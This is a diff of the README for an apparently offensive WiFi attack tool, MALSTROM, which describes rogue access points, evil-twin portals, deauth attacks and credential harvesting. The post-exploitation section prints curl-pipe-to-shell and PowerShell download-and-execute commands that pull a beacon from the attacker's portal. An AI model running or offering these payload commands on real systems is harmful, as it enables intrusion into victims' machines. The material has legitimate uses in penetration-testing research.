@@ -39,6 +39,7 @@ MALSTROM automates rogue access point deployment, evil twin portals, deauth/disa
 
 ## 📖 Description
 
+
 **DarkSec MALSTROM** automates the end-to-end WiFi attack vector from a single process. It handles target SSID cloning, frame injection, and OS-adaptive captive portal deployment while driving an interactive web dashboard bound to `http://127.0.0.1:8888`.
 
 The rogue AP runs on a virtual interface (`ap0`) carved from a spare radio to preserve active upstream management connections.
@@ -59,10 +60,12 @@ The rogue AP runs on a virtual interface (`ap0`) carved from a spare radio to pr
 └─────────────────────────────────────────────────────────────────────────┘
 ```
 > ⚠️ IMPORTANT
+> 
 > This tool is intended for authorized penetration testing, network troubleshooting, or educational research only. Unauthorized use against networks you do not own or have explicit permission to test is illegal.
 >
 > 
 ✨ Features
+
  * Zero-Configuration Deployment: Single command installation script that automatically sets up system dependencies, Python environments, and binary shortcuts.
  * Real-Time Web UI: Operator dashboard running on 127.0.0.1:8888 backed by SSE live streams for real-time telemetry, credential feeds, and target maps.
  * Virtual Radio Management: Carves an ap0 interface from secondary radio hardware to prevent management dropouts during rogue AP campaigns.
@@ -73,6 +76,7 @@ The rogue AP runs on a virtual interface (`ap0`) carved from a spare radio to pr
 
 
 🛠️ Requirements
+
  * Hardware: Minimum 2 WiFi interfaces (1 supporting monitor mode/injection + 1 supporting AP mode).
  * OS: Linux (Kernel 5.x or newer with root privileges).
  * Dependencies:
@@ -95,6 +99,7 @@ sudo ./install.sh
 ```
 
 💻 Usage
+
 Launch MALSTROM directly using the EXECUTABLE or.... :
 # Full stack execution (Engine + Captive Portal + Web Dashboard)
 ```text
@@ -112,6 +117,7 @@ sudo malstrom --no-auth
 ```
 
 🕹️ CLI Service Commands
+
 ```text
 sudo malstrom start       # Start background daemon & display access details
 sudo malstrom launch      # Start daemon if needed and launch signed-in UI
@@ -121,6 +127,7 @@ malstrom token            # Print current operator access token
 ```
 
 🖥️ Dashboard Workspaces
+
 | Tab | Functionality |
 |---|---|
 | Attack | Configure BSSID/SSID/Channel targets, portal modes, and deauth burst rates. |
@@ -135,6 +142,7 @@ malstrom token            # Print current operator access token
 
 
 ⚙️ Post-Exploitation Modules
+
 1. Recon & Mapping
 Executes network sweeps across target subnets (including rogue 172.16.52.0/24 or accessible LAN CIDRs). Results feed directly into the credential spray engine.
 # Executed via Web Dashboard or CLI Orchestrator
@@ -156,6 +164,7 @@ curl -s http://<portal-ip>/beacon | sh
 powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<portal-ip>/beacon.ps1')"
 
 📊 Capture & Deauth Specifications
+
 WPA Capture Vectors
 | Capture Mode | Target Frame Types | Harvest Output |
 |---|---|---|
@@ -185,6 +194,7 @@ sudo malstrom reset
 ```
 
 🤝 Contributing
+
 Contributions are welcome!
  * Fork the repository (https://github.com/wickednull/malstrom/fork).
  * Create your feature branch (git checkout -b feature/amazing-feature).
@@ -195,10 +205,12 @@ Contributions are welcome!
 
 
 ⚠️ Disclaimer
+
 Use at your own risk. The authors assume no liability for misuse or damage caused by this tool. MALSTROM is provided as-is for security research and authorized testing only. Always obtain proper written permission before testing on any network or device.
 
 
 📄 License
+
 
 Distributed under the MIT License. See LICENSE for details.
 <p align="center">
